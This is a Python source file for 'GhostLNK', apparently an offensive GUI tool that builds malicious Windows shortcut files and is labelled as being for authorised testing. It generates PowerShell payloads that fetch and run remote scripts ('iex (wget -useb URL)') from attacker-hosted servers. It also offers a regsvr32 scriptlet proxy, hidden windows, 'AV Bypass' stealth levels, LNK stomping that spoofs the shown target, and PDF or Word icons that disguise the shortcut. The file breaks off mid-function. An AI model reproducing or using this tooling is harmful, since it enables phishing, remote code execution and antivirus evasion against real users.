#!/usr/bin/env python3
"""
GhostLNK - Professional LNK Generator with Advanced Evasion
Created by: github.com/Excalibra
Coded for educational and authorized testing purposes only
"""

import os
import sys
import base64
import json
import subprocess
import re
import tempfile
import time
from datetime import datetime
from pathlib import Path

# ----------------------------------------------------------------------
# Robust dependency handling
# ----------------------------------------------------------------------
def ensure_pyqt6():
    try:
        from PyQt6.QtWidgets import QApplication
        return True
    except ImportError:
        print("[-] PyQt6 not installed. Attempting to install...")
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", "PyQt6"])
        except Exception as e:
            print(f"[!] Failed to install PyQt6: {e}")
            sys.exit(1)
        try:
            from PyQt6.QtWidgets import QApplication
            return True
        except ImportError:
            print("[!] PyQt6 installation failed. Please install manually: pip install PyQt6")
            sys.exit(1)

def ensure_pylnk3():
    try:
        import pylnk3
        return True
    except ImportError:
        print("[-] pylnk3 not installed. Installing...")
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", "pylnk3"])
        except Exception as e:
            print(f"[!] Failed to install pylnk3: {e}")
            sys.exit(1)
        try:
            import pylnk3
            return True
        except ImportError:
            print("[!] pylnk3 installation failed. Please install manually: pip install pylnk3")
            sys.exit(1)

ensure_pyqt6()
ensure_pylnk3()

from PyQt6.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout,
                             QHBoxLayout, QLabel, QLineEdit, QPushButton,
                             QTextEdit, QComboBox, QGroupBox, QGridLayout,
                             QMessageBox, QFileDialog, QSpinBox, QCheckBox,
                             QTabWidget, QListWidget, QListWidgetItem, QMenu,
                             QSplitter, QFrame, QProgressBar, QToolTip,
                             QScrollArea, QButtonGroup, QRadioButton)
from PyQt6.QtCore import Qt, QTimer, QMimeData, QThread, pyqtSignal, QSize
from PyQt6.QtGui import QIcon, QFont, QPalette, QColor, QAction, QClipboard, QScreen

import pylnk3

# Configuration file
CONFIG_FILE = "ghostlnk_config.json"

class URLExamples:
    """Collection of URL examples for different scenarios"""

    DROPBOX_EXAMPLE = "https://www.dropbox.com/scl/fi/6z4obwg71nm7wu5plfvtr/doc.pdf?rlkey=rl63zpok5szx3ruly7pfmltqn&st=17b8n5wl&dl=1"
    DROPBOX_PS1_EXAMPLE = "https://www.dropbox.com/scl/fi/abc123/script.ps1?rlkey=xyz&dl=1"

    @staticmethod
    def get_all_examples():
        return {
            "Dropbox PDF": {
                "url": URLExamples.DROPBOX_EXAMPLE,
                "type": "document",
                "note": "PDF file - Use Download & Open mode"
            },
            "Dropbox PowerShell": {
                "url": URLExamples.DROPBOX_PS1_EXAMPLE,
                "type": "script",
                "note": "PowerShell script - Use Memory Execute mode"
            },
            "Your VPS - File": {
                "url": "http://YOUR-VPS-IP:8000/file.pdf",
                "type": "document",
                "note": "Host your own files"
            },
            "Your VPS - Script": {
                "url": "http://YOUR-VPS-IP:8000/script.ps1",
                "type": "script",
                "note": "Host PowerShell scripts"
            }
        }


class PowerShellConverter:
    """Convert URLs to PowerShell -E format with stealth options"""

    @staticmethod
    def create_download_and_open_payload(url, pause=True, debug=False, stealth_level=0):
        if stealth_level == 2:
            ps_command = f'''
$u="{url}";
$t=[IO.Path]::GetTempPath();
$f=[IO.Path]::Combine($t,"doc.pdf");
(New-Object Net.WebClient).DownloadFile($u,$f);
Start "$f";
'''
            return ps_command.strip()
        elif stealth_level == 1:
            ps_command = f'''
$url = "{url}"
$temp = [IO.Path]::GetTempPath()
$file = Join-Path $temp "doc.pdf"
(New-Object Net.WebClient).DownloadFile($url, $file)
Start-Process $file
'''
            return ps_command.strip()
        elif debug:
            pause_cmd = """
Write-Host "";
Write-Host "Press any key to exit this window..." -ForegroundColor White;
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown");
""" if pause else ""
            ps_command = f'''
# GhostLNK - Download & Open Mode (DEBUG)
Write-Host "========================================" -ForegroundColor Cyan;
Write-Host "📁 DEBUG MODE - Download & Open" -ForegroundColor Cyan;
Write-Host "========================================" -ForegroundColor Cyan;
Write-Host "";
Write-Host "[+] Target URL: {url}" -ForegroundColor Yellow;
Write-Host "[+] Mode: Saving to temp and opening" -ForegroundColor Yellow;
Write-Host "";
if ("{url}" -like "*dropbox.com*") {{
    Write-Host "[!] Dropbox URL detected - Checking parameters..." -ForegroundColor Yellow;
    if ("{url}" -notlike "*dl=1*") {{
        Write-Host "[⚠️] WARNING: Dropbox URL missing 'dl=1' parameter!" -ForegroundColor Red;
        Write-Host "[⚠️] Add '&dl=1' to the end of the URL for direct download" -ForegroundColor Red;
    }} else {{
        Write-Host "[✓] Dropbox URL has correct 'dl=1' parameter" -ForegroundColor Green;
    }}
}}
try {{
    Write-Host "[+] Testing URL connection..." -ForegroundColor Yellow;
    $testRequest = [System.Net.WebRequest]::Create("{url}");
    $testRequest.Method = "HEAD";
    $testRequest.Timeout = 5000;
    $testResponse = $testRequest.GetResponse();
    Write-Host "[✓] URL is accessible! Status: $($testResponse.StatusCode)" -ForegroundColor Green;
    Write-Host "[+] Content-Type: $($testResponse.ContentType)" -ForegroundColor Green;
    Write-Host "[+] Content-Length: $($testResponse.ContentLength) bytes" -ForegroundColor Green;
    $testResponse.Close();
}}
catch {{
    Write-Host "[✗] URL test failed: $_" -ForegroundColor Red;
    Write-Host "[✗] Check if URL is correct and accessible" -ForegroundColor Red;
}}
Write-Host "";
Write-Host "[+] Creating temp file..." -ForegroundColor Yellow;
$tempDir = [System.IO.Path]::GetTempPath();
$timestamp = Get-Date -Format "yyyyMMddHHmmss";
$tempFile = Join-Path $tempDir "doc_$timestamp.pdf";
Write-Host "[+] Saving to: $tempFile" -ForegroundColor Yellow;
try {{
    Write-Host "[+] Downloading file..." -ForegroundColor Yellow;
    $wc = New-Object System.Net.WebClient;
    $wc.DownloadFile("{url}", $tempFile);
    $fileSize = (Get-Item $tempFile).Length;
    Write-Host "[✓] Download complete! Size: $fileSize bytes" -ForegroundColor Green;
    Write-Host "[+] Opening file with default application..." -ForegroundColor Yellow;
    Invoke-Item $tempFile;
    Write-Host "[✓] File opened successfully!" -ForegroundColor Green;
}}
catch {{
    Write-Host "[✗] Error: $_" -ForegroundColor Red;
    Write-Host "[✗] Exception type: $($_.Exception.GetType().Name)" -ForegroundColor Red;
}}
finally {{
    Write-Host "";
    Write-Host "========================================" -ForegroundColor Cyan;
    Write-Host "📁 DEBUG MODE - Execution Complete" -ForegroundColor Cyan;
    Write-Host "========================================" -ForegroundColor Cyan;
}}
{pause_cmd}
'''
        else:
            pause_cmd = """
Write-Host "";
Write-Host "Press any key to exit this window..." -ForegroundColor White;
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown");
""" if pause else ""
            ps_command = f'''
# GhostLNK - Download & Open
Write-Host "[+] Downloading file..." -ForegroundColor Green;
$tempDir = [System.IO.Path]::GetTempPath();
$timestamp = Get-Date -Format "yyyyMMddHHmmss";
$tempFile = Join-Path $tempDir "doc_$timestamp.pdf";
$wc = New-Object System.Net.WebClient;
$wc.DownloadFile("{url}", $tempFile);
Invoke-Item $tempFile;
Write-Host "[✓] Done!" -ForegroundColor Green;
{pause_cmd}
'''
        return ps_command.strip()

    @staticmethod
    def create_memory_execute_payload(url, pause=True, debug=False, stealth_level=0):
        if stealth_level == 2:
            return f'iex (wget -useb "{url}");'
        elif stealth_level == 1:
            return f'iex (wget -useb "{url}");'
        elif debug:
            pause_cmd = """
Write-Host "";
Write-Host "Press any key to exit this window..." -ForegroundColor White;
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown");
""" if pause else ""
            ps_command = f'''
# GhostLNK - Memory Execute Mode (DEBUG)
Write-Host "========================================" -ForegroundColor Cyan;
Write-Host "⚡ DEBUG MODE - Memory Execute" -ForegroundColor Cyan;
Write-Host "========================================" -ForegroundColor Cyan;
Write-Host "";
Write-Host "[+] Target URL: {url}" -ForegroundColor Yellow;
Write-Host "[+] Mode: Memory-only execution (no files saved)" -ForegroundColor Yellow;
Write-Host "";
if ("{url}" -like "*dropbox.com*") {{
    Write-Host "[!] Dropbox URL detected - Checking parameters..." -ForegroundColor Yellow;
    if ("{url}" -notlike "*dl=1*") {{
        Write-Host "[⚠️] WARNING: Dropbox URL missing 'dl=1' parameter!" -ForegroundColor Red;
        Write-Host "[⚠️] Add '&dl=1' to the end of the URL for direct download" -ForegroundColor Red;
    }} else {{
        Write-Host "[✓] Dropbox URL has correct 'dl=1' parameter" -ForegroundColor Green;
    }}
}}
try {{
    Write-Host "[+] Testing URL connection..." -ForegroundColor Yellow;
    $testRequest = [System.Net.WebRequest]::Create("{url}");
    $testRequest.Method = "HEAD";
    $testRequest.Timeout = 5000;
    $testResponse = $testRequest.GetResponse();
    Write-Host "[✓] URL is accessible! Status: $($testResponse.StatusCode)" -ForegroundColor Green;
    Write-Host "[+] Content-Type: $($testResponse.ContentType)" -ForegroundColor Green;
    Write-Host "[+] Content-Length: $($testResponse.ContentLength) bytes" -ForegroundColor Green;
    $testResponse.Close();
}}
catch {{
    Write-Host "[✗] URL test failed: $_" -ForegroundColor Red;
    Write-Host "[✗] Check if URL is correct and accessible" -ForegroundColor Red;
}}
Write-Host "";
Write-Host "[+] Executing in memory..." -ForegroundColor Yellow;
try {{
    Invoke-Expression (wget -useb "{url}");
    Write-Host "[✓] Execution completed!" -ForegroundColor Green;
}}
catch {{
    Write-Host "[✗] Execution failed: $_" -ForegroundColor Red;
    Write-Host "[!] Make sure URL points to a PowerShell script (.ps1)" -ForegroundColor Red;
}}
finally {{
    Write-Host "";
    Write-Host "========================================" -ForegroundColor Cyan;
    Write-Host "⚡ DEBUG MODE - Execution Complete" -ForegroundColor Cyan;
    Write-Host "========================================" -ForegroundColor Cyan;
}}
{pause_cmd}
'''
        else:
            pause_cmd = """
Write-Host "";
Write-Host "Press any key to exit this window..." -ForegroundColor White;
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown");
""" if pause else ""
            ps_command = f'''
# GhostLNK - Memory Execute
Write-Host "[+] Executing script..." -ForegroundColor Green;
Invoke-Expression (wget -useb "{url}");
Write-Host "[✓] Done!" -ForegroundColor Green;
{pause_cmd}
'''
        return ps_command.strip()

    @staticmethod
    def create_stealth_payload(url, pause=False, debug=False, stealth_level=0):
        if stealth_level == 2:
            return f'iex (wget -useb "{url}");'
        elif stealth_level == 1:
            return f'iex (wget -useb "{url}");'
        elif debug:
            pause_cmd = """
Write-Host "";
Write-Host "Press any key to exit this window..." -ForegroundColor White;
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown");
""" if pause else ""
            ps_command = f'''
# GhostLNK - Stealth Mode
Invoke-Expression (wget -useb "{url}");
{pause_cmd}
'''
            return ps_command.strip()
        else:
            pause_cmd = """
Write-Host "";
Write-Host "Press any key to exit this window..." -ForegroundColor White;
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown");
""" if pause else ""
            ps_command = f'''
# GhostLNK - Stealth Mode
Invoke-Expression (wget -useb "{url}");
{pause_cmd}
'''
            return ps_command.strip()

    @staticmethod
    def validate_dropbox_url(url):
        if 'dropbox.com' in url.lower():
            if 'dl=1' not in url:
                return False, "Dropbox URL missing 'dl=1' parameter. Add '&dl=1' or '?dl=1' to the end."
            return True, "Valid Dropbox URL"
        return True, "Not a Dropbox URL"

    @staticmethod
    def guess_payload_type(url):
        url_lower = url.lower()
        if '.ps1' in url_lower:
            return "memory_execute"
        elif '.exe' in url_lower:
            return "download_open"
        else:
            return "download_open"


class LNKEngine:
    """Core LNK generation engine with advanced evasion options"""

    WINDOW_NORMAL = 'Normal'
    WINDOW_MAXIMIZED = 'Maximized'
    WINDOW_MINIMIZED = 'Minimized'

    @staticmethod
    def _build_shell_item_list(target_path):
        """Build a pylnk3 LinkTargetIDList for a given Windows path."""
        target_split = target_path.split('\\')
        target_file = target_split[-1]
        target_drive = target_split[0]

        def build_entry(name, is_dir):
            entry = pylnk3.PathSegmentEntry()
            entry.type = pylnk3.TYPE_FOLDER if is_dir else pylnk3.TYPE_FILE
            entry.file_size = 0
            n = datetime.now()
            entry.modified = n
            entry.created = n
            entry.accessed = n
            entry.short_name = name
            entry.full_name = name
            return entry

        elements = [
            pylnk3.RootEntry(pylnk3.ROOT_MY_COMPUTER),
            pylnk3.DriveEntry(target_drive)
        ]
        for level in target_split[1:-1]:
            if level:
                elements.append(build_entry(level, is_dir=True))
        elements.append(build_entry(target_file, is_dir=False))

        id_list = pylnk3.LinkTargetIDList()
        id_list.items = elements
        return id_list

    @staticmethod
    def create_lnk(output_filename, target_path, arguments, icon_path, icon_index,
                   description, working_dir=None, stealth_level=0, hide_powershell=False,
                   use_proxy=False, spoof_target_path=None, regsvr32_unc=None):
        """
        Create a Windows LNK file with advanced evasion techniques.

        - use_proxy: launch via conhost.exe
        - spoof_target_path: make the LNK appear to point to this path (LNK Stomping)
        - regsvr32_unc: use regsvr32.exe to execute a remote scriptlet/DLL (fileless)
        """
        # --- regsvr32 mode overrides everything ---
        if regsvr32_unc:
            target_path = r"C:\Windows\System32\regsvr32.exe"
            # Typical fileless execution: regsvr32 /s /n /i:http://server/file.sct scrobj.dll
            arguments = f'/s /n /i:"{regsvr32_unc}" scrobj.dll'
            # regsvr32 is not powershell, so disable powershell-specific flags
            hide_powershell = False
            stealth_level = 0
            use_proxy = False

        # --- Proxy modification (conhost.exe) ---
        is_powershell = target_path.lower().endswith("powershell.exe")
        if use_proxy and is_powershell and not regsvr32_unc:
            target_path = r"C:\Windows\System32\conhost.exe"
            arguments = f'powershell.exe {arguments}'

        # Parse target path for LNK internals
        target_split = target_path.split('\\')
        target_file = target_split[-1]
        target_drive = target_split[0]
        target_directory = working_dir or '\\'.join(target_split[:-1])

        # Create LNK object
        lnk = pylnk3.create(output_filename)
        lnk.specify_local_location(target_path)

        # Configure link info
        lnk._link_info.size_local_volume_table = 0
        lnk._link_info.volume_label = ""
        lnk._link_info.drive_serial = 0
        lnk._link_info.local = True
        lnk._link_info.local_base_path = target_path

        # Handle PowerShell hidden window / stealth flags (only for PowerShell)
        if is_powershell and not regsvr32_unc:
            if hide_powershell:
                if use_proxy:
                    if arguments.startswith('powershell.exe -E '):
                        args_without_pwsh = arguments[14:]
                        encoded = args_without_pwsh[3:]
                        arguments = f'powershell.exe -WindowStyle Hidden -E {encoded}'
                    elif arguments.startswith('powershell.exe -W 1 -E '):
                        args_without_pwsh = arguments[14:]
                        encoded = args_without_pwsh[args_without_pwsh.find('-E ')+3:]
                        arguments = f'powershell.exe -WindowStyle Hidden -E {encoded}'
                    elif arguments.startswith('powershell.exe '):
                        arguments = arguments.replace('powershell.exe ', 'powershell.exe -WindowStyle Hidden ')
                else:
                    if arguments.startswith('-E '):
                        encoded = arguments[3:]
                        arguments = f'-WindowStyle Hidden -E {encoded}'
                lnk.window_mode = LNKEngine.WINDOW_MINIMIZED
            else:
                if stealth_level == 2:
                    if use_proxy:
                        if arguments.startswith('powershell.exe -E '):
                            args_without_pwsh = arguments[14:]
                            encoded = args_without_pwsh[3:]
                            arguments = f'powershell.exe -E {encoded}'
                        elif arguments.startswith('powershell.exe -W 1 -E '):
                            args_without_pwsh = arguments[14:]
                            encoded = args_without_pwsh[args_without_pwsh.find('-E ')+3:]
                            arguments = f'powershell.exe -E {encoded}'
                    else:
                        if arguments.startswith('-E '):
                            encoded = arguments[3:]
                            arguments = f'-E {encoded}'
                    lnk.window_mode = LNKEngine.WINDOW_MINIMIZED
                elif stealth_level == 1:
                    if use_proxy:
                        if arguments.startswith('powershell.exe -E '):
                            args_without_pwsh = arguments[14:]
                            encoded = args_without_pwsh[3:]
                            arguments = f'powershell.exe -W 1 -E {encoded}'
                        elif arguments.startswith('powershell.exe '):
                            arguments = arguments.replace('powershell.exe ', 'powershell.exe -W 1 ')
                    else:
                        if arguments.startswith('-E '):
                            encoded = arguments[3:]
                            arguments = f'-W 1 -E {encoded}'
                    lnk.window_mode = LNKEngine.WINDOW_MINIMIZED
                else:
                    lnk.window_mode = LNKEngine.WINDOW_NORMAL
        else:
            lnk.window_mode = LNKEngine.WINDOW_NORMAL

        if arguments:
            lnk.arguments = arguments

        lnk.icon = icon_path
        lnk.icon_index = icon_index
        lnk.working_dir = target_directory
        if description:
            lnk.description = description

        # --- LNK Stomping: Override the displayed target path ---
        if spoof_target_path:
            # Build a shell item list for the fake target
            fake_id_list = LNKEngine._build_shell_item_list(spoof_target_path)
            lnk.shell_item_id_list = fake_id_list
            # Also update link info to match the fake path (optional but helps consistency)
            lnk._link_info.local_base_path = spoof_target_path
        else:
            # Normal shell item list
            def build_entry(name, is_dir):
                entry = pylnk3.PathSegmentEntry()
                entry.type = pylnk3.TYPE_FOLDER if is_dir else pylnk3.TYPE_FILE
                entry.file_size = 0
                n = datetime.now()
                entry.modified = n
                entry.created = n
                entry.accessed = n
                entry.short_name = name
                entry.full_name = name
                return entry

            elements = [
                pylnk3.RootEntry(pylnk3.ROOT_MY_COMPUTER),
                pylnk3.DriveEntry(target_drive)
            ]
            for level in target_split[1:-1]:
                if level:
                    elements.append(build_entry(level, is_dir=True))
            elements.append(build_entry(target_file, is_dir=False))
            id_list = pylnk3.LinkTargetIDList()
            id_list.items = elements
            lnk.shell_item_id_list = id_list

        # Write the LNK file
        with open(output_filename, 'wb') as f:
            lnk.write(f)

        return True


class GhostLNKGUI(QMainWindow):
    """Main GUI Window - GhostLNK with LNK Stomping & regsvr32 Proxy"""

    ICON_DATABASE = {
        "PDF Document": (r"%ProgramFiles(x86)%\Microsoft\Edge\Application\msedge.exe", 11, ".pdf"),
        "Word Document": (r"C:\Windows\System32\SHELL32.dll", 1, ".doc"),
        "Excel Spreadsheet": (r"C:\Windows\System32\SHELL32.dll", 3, ".xls"),
        "Text Document": (r"C:\Windows\System32\notepad.exe", 0, ".txt"),
        "PowerShell Script": (r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", 0, ".ps1"),
        "Executable": (r"C:\Windows\System32\SHELL32.dll", 3, ".exe"),
        "JPG Image": (r"C:\Windows\System32\imageres.dll", 67, ".jpg"),
        "ZIP Archive": (r"C:\Windows\System32\imageres.dll", 165, ".zip"),
    }

    def __init__(self):
        super().__init__()
        self.recent_urls = []
        self.recent_conversions = []
        self.load_config()
        self.init_ui()

    def load_config(self):
        if os.path.exists(CONFIG_FILE):
            try:
                with open(CONFIG_FILE, 'r') as f:
                    config = json.load(f)
                    self.recent_urls = config.get('recent_urls', [])
                    self.recent_conversions = config.get('recent_conversions', [])
            except:
                self.recent_urls = []
                self.recent_conversions = []

    def save_config(self):
        config = {
            'recent_urls': self.recent_urls[-20:],
            'recent_conversions': self.recent_conversions[-20:]
        }
        with open(CONFIG_FILE, 'w') as f:
            json.dump(config, f)

    def init_ui(self):
        self.setWindowTitle("👻 Advanced Evasion | Created by github.com/Excalibra")
        screen = QApplication.primaryScreen().availableGeometry()
        window_width = int(screen.width() * 0.9)
        window_height = int(screen.height() * 0.85)
        self.setGeometry(50, 50, window_width, window_height)
        self.setMinimumSize(1200, 750)

        self.setStyleSheet("""
            QMainWindow { background-color: #1a1a2e; }
            QLabel { color: #e0e0e0; font-size: 11px; }
            QLineEdit, QTextEdit, QComboBox, QSpinBox {
                background-color: #16213e;
                color: #e0e0e0;
                border: 1px solid #0f3460;
                border-radius: 3px;
                padding: 4px;
                font-size: 11px;
            }
            QPushButton {
                background-color: #0f3460;
                color: white;
                border: none;
                border-radius: 3px;
                padding: 6px;
                font-size: 11px;
                font-weight: bold;
            }
            QPushButton:hover { background-color: #1a4b8c; }
            QGroupBox {
                color: #e0e0e0;
                border: 2px solid #0f3460;
                border-radius: 5px;
                margin-top: 8px;
                font-size: 12px;
                font-weight: bold;
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                left: 10px;
                padding: 0 5px 0 5px;
            }
            QRadioButton, QCheckBox { color: #e0e0e0; font-size: 11px; }
        """)

        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        main_layout = QVBoxLayout(central_widget)
        main_layout.setSpacing(5)
        main_layout.setContentsMargins(8, 8, 8, 8)

        title = QLabel("👻 GhostLNK 👻")
        title.setAlignment(Qt.AlignmentFlag.AlignCenter)
        title.setStyleSheet("color: #a8a8ff; font-size: 18px; font-weight: bold; padding: 5px;")
        main_layout.addWidget(title)

        credit = QLabel("Created by: github.com/Excalibra")
        credit.setAlignment(Qt.AlignmentFlag.AlignCenter)
        credit.setStyleSheet("color: #88ff88; font-size: 12px; font-weight: bold; padding-bottom: 2px;")
        main_layout.addWidget(credit)

        subtitle = QLabel("📌 Dropbox: &dl=1 | STEALTH: Avoids suspicious patterns | HIDE: -WindowStyle Hidden | RAW TARGET: Custom EXE | EVASION: Stomp & regsvr32")
        subtitle.setAlignment(Qt.AlignmentFlag.AlignCenter)
        subtitle.setStyleSheet("color: #ffaa00; font-size: 11px; padding-bottom: 5px;")
        main_layout.addWidget(subtitle)

        splitter = QSplitter(Qt.Orientation.Horizontal)
        main_layout.addWidget(splitter)

        left_scroll = QScrollArea()
        left_scroll.setWidgetResizable(True)
        left_scroll.setWidget(self.create_converter_panel())
        splitter.addWidget(left_scroll)

        right_scroll = QScrollArea()
        right_scroll.setWidgetResizable(True)
        right_scroll.setWidget(self.create_lnk_panel())
        splitter.addWidget(right_scroll)

        splitter.setSizes([int(window_width * 0.45), int(window_width * 0.45)])

        console_group = QGroupBox("👻 Console Output")
        console_layout = QVBoxLayout()
        toolbar = QHBoxLayout()
        clear_btn = QPushButton("Clear Console")
        clear_btn.setMaximumWidth(100)
        clear_btn.clicked.connect(lambda: self.console.clear())
        toolbar.addWidget(clear_btn)
        toolbar.addStretch()
        console_layout.addLayout(toolbar)
        self.console = QTextEdit()
        self.console.setReadOnly(True)
        self.console.setMaximumHeight(120)
        self.console.setStyleSheet("background-color: #0a0a1a; color: #9fdf9f; font-family: monospace; font-size: 10px;")
        console_layout.addWidget(self.console)
        console_group.setLayout(console_layout)
        main_layout.addWidget(console_group)

        self.statusBar().showMessage("👻 Created by github.com/Excalibra")
        self.statusBar().setStyleSheet("color: #a8a8ff;")

        self.create_menu()
        self.log("👻 GhostLNK initialized - LNK Stomping & regsvr32 Proxy added")
        self.log("[✓] Custom executable target, stealth levels, hidden window")
        self.log("[✓] Advanced Evasion: conhost proxy, LNK Stomping, regsvr32 fileless")

    def create_converter_panel(self):
        panel = QWidget()
        layout = QVBoxLayout(panel)
        layout.setSpacing(6)

        url_group = QGroupBox("Step 1: Enter URL")
        url_layout = QVBoxLayout()
        self.url_input = QLineEdit()
        self.url_input.setPlaceholderText("https://www.dropbox.com/scl/fi/.../file.pdf?dl=1")
        self.url_input.textChanged.connect(self.on_url_changed)
        url_layout.addWidget(self.url_input)
        self.dropbox_indicator = QLabel("")
        self.dropbox_indicator.setStyleSheet("color: #ffaa00; font-size: 9px;")
        url_layout.addWidget(self.dropbox_indicator)
        url_group.setLayout(url_layout)
        layout.addWidget(url_group)

        examples_group = QGroupBox("Quick Examples")
        examples_layout = QGridLayout()
        btn1 = QPushButton("📄 PDF Example")
        btn1.clicked.connect(lambda: self.load_url(URLExamples.DROPBOX_EXAMPLE))
        examples_layout.addWidget(btn1, 0, 0)
        btn2 = QPushButton("⚡ PowerShell Example")
        btn2.clicked.connect(lambda: self.load_url(URLExamples.DROPBOX_PS1_EXAMPLE))
        examples_layout.addWidget(btn2, 0, 1)
        btn3 = QPushButton("🖥️ Your VPS - File")
        btn3.clicked.connect(lambda: self.load_url("http://YOUR-VPS:8000/file.pdf"))
        examples_layout.addWidget(btn3, 1, 0)
        btn4 = QPushButton("🖥️ Your VPS - Script")
        btn4.clicked.connect(lambda: self.load_url("http://YOUR-VPS:8000/script.ps1"))
        examples_layout.addWidget(btn4, 1, 1)
        examples_group.setLayout(examples_layout)
        layout.addWidget(examples_group)

        type_group = QGroupBox("Step 2: Select Payload Type")
        type_layout = QVBoxLayout()
        self.type_combo = QComboBox()
        self.type_combo.addItems([
            "📁 Download & Open (For PDFs, images, documents)",
            "⚡ Memory Execute (For PowerShell scripts only)",
            "🕵️ Ultra Stealth (Minimal output)"
        ])
        self.type_combo.currentIndexChanged.connect(self.on_type_changed)
        type_layout.addWidget(self.type_combo)
        self.type_hint = QLabel("Selected: For PDFs and documents - saves to temp and opens")
        self.type_hint.setWordWrap(True)
        self.type_hint.setStyleSheet("color: #8888aa; font-size: 9px; padding: 2px;")
        type_layout.addWidget(self.type_hint)
        type_group.setLayout(type_layout)
        layout.addWidget(type_group)

        stealth_group = QGroupBox("Step 3: Stealth Level")
        stealth_layout = QVBoxLayout()
        self.stealth_combo = QComboBox()
        self.stealth_combo.addItems([
            "0 - Normal (Visible output)",
            "1 - Moderate Stealth (Basic obfuscation)",
            "2 - Maximum Stealth (AV Bypass)"
        ])
        self.stealth_combo.currentIndexChanged.connect(self.on_stealth_changed)
        stealth_layout.addWidget(self.stealth_combo)
        self.stealth_hint = QLabel("Maximum Stealth: Uses aliases, avoids -WindowStyle Hidden, minimal code")
        self.stealth_hint.setWordWrap(True)
        self.stealth_hint.setStyleSheet("color: #88ff88; font-size: 9px; padding: 2px;")
        stealth_layout.addWidget(self.stealth_hint)
        stealth_group.setLayout(stealth_layout)
        layout.addWidget(stealth_group)

        options_group = QGroupBox("Step 4: Execution Options")
        options_layout = QVBoxLayout()
        self.pause_cb = QCheckBox("⏸️ Pause after execution (Window stays open)")
        self.pause_cb.setChecked(False)
        self.pause_cb.toggled.connect(self.update_options)
        options_layout.addWidget(self.pause_cb)
        self.debug_cb = QCheckBox("🐛 Enable Debug Mode (Verbose output)")
        self.debug_cb.setChecked(False)
        self.debug_cb.toggled.connect(self.update_options)
        options_layout.addWidget(self.debug_cb)
        self.hide_pwsh_cb = QCheckBox("🔒 Hide PowerShell Window (-WindowStyle Hidden)")
        self.hide_pwsh_cb.setChecked(False)
        self.hide_pwsh_cb.toggled.connect(self.update_options)
        options_layout.addWidget(self.hide_pwsh_cb)
        options_group.setLayout(options_layout)
        layout.addWidget(options_group)

        gen_group = QGroupBox("Step 5: Generate (Click in Order: 1 → 2 → 3 → 🚀)")
        gen_group.setStyleSheet("QGroupBox { font-weight: bold; color: #ffaa00; }")
        gen_layout = QVBoxLayout()
        order_label = QLabel("⚠️ MUST CLICK IN THIS ORDER: 1 → 2 → 3 → 🚀")
        order_label.setStyleSheet("color: #ff8888; font-weight: bold; font-size: 10px; padding: 2px;")
        order_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        gen_layout.addWidget(order_label)
        btn_row1 = QHBoxLayout()
        self.show_btn = QPushButton("1️ Show Command (Step 1)")
        self.show_btn.setStyleSheet("background-color: #0f3460; font-weight: bold;")
        self.show_btn.clicked.connect(self.show_command)
        btn_row1.addWidget(self.show_btn)
        self.encode_btn = QPushButton("2️ Encode to Base64 (Step 2)")
        self.encode_btn.setStyleSheet("background-color: #d35400; font-weight: bold;")
        self.encode_btn.clicked.connect(self.encode)
        btn_row1.addWidget(self.encode_btn)
        gen_layout.addLayout(btn_row1)
        btn_row2 = QHBoxLayout()
        self.copy_btn = QPushButton("3️ Copy -E Argument (Step 3)")
        self.copy_btn.setStyleSheet("background-color: #27ae60; font-weight: bold;")
        self.copy_btn.clicked.connect(self.copy_arg)
        btn_row2.addWidget(self.copy_btn)
        self.use_btn = QPushButton("🚀 Use in LNK Generator (Step 4)")
        self.use_btn.setStyleSheet("background-color: #8e44ad; font-weight: bold; color: white;")
        self.use_btn.clicked.connect(self.use_in_lnk)
        btn_row2.addWidget(self.use_btn)
        gen_layout.addLayout(btn_row2)
        progress_frame = QFrame()
        progress_frame.setFrameStyle(QFrame.Shape.Box)
        progress_frame.setStyleSheet("background-color: #16213e; padding: 5px;")
        progress_layout = QHBoxLayout(progress_frame)
        progress_layout.addWidget(QLabel("Progress:"))
        self.step1_indicator = QLabel("⚪ Step 1")
        self.step1_indicator.setStyleSheet("color: #666666;")
        progress_layout.addWidget(self.step1_indicator)
        progress_layout.addWidget(QLabel("→"))
        self.step2_indicator = QLabel("⚪ Step 2")
        self.step2_indicator.setStyleSheet("color: #666666;")
        progress_layout.addWidget(self.step2_indicator)
        progress_layout.addWidget(QLabel("→"))
        self.step3_indicator = QLabel("⚪ Step 3")
        self.step3_indicator.setStyleSheet("color: #666666;")
        progress_layout.addWidget(self.step3_indicator)
        progress_layout.addWidget(QLabel("→"))
        self.step4_indicator = QLabel("⚪ Step 4")
        self.step4_indicator.setStyleSheet("color: #666666;")
        progress_layout.addWidget(self.step4_indicator)
        progress_layout.addStretch()
        gen_layout.addWidget(progress_frame)
        gen_group.setLayout(gen_layout)
        layout.addWidget(gen_group)

        results_group = QGroupBox("Results")
        results_layout = QVBoxLayout()
        self.cmd_display = QTextEdit()
        self.cmd_display.setMaximumHeight(50)
        results_layout.addWidget(QLabel("PowerShell Command:"))
        results_layout.addWidget(self.cmd_display)
        self.arg_display = QTextEdit()
        self.arg_display.setMaximumHeight(40)
        self.arg_display.setStyleSheet("color: #ff8888;")
        results_layout.addWidget(QLabel("Final -E Argument (copy this):"))
        results_layout.addWidget(self.arg_display)
        results_group.setLayout(results_layout)
        layout.addWidget(results_group)

        recent_group = QGroupBox("Recent")
        recent_layout = QVBoxLayout()
        self.recent_list = QListWidget()
        self.recent_list.setMaximumHeight(60)
        recent_layout.addWidget(self.recent_list)
        recent_group.setLayout(recent_layout)
        layout.addWidget(recent_group)

        layout.addStretch()
        return panel

    def create_lnk_panel(self):
        panel = QWidget()
        layout = QVBoxLayout(panel)
        layout.setSpacing(6)

        # Raw Target Mode
        raw_group = QGroupBox("⚙️ Raw Target Mode (Bypass PowerShell)")
        raw_layout = QVBoxLayout()
        self.raw_mode_cb = QCheckBox("Enable Raw Target Mode (use custom EXE / command)")
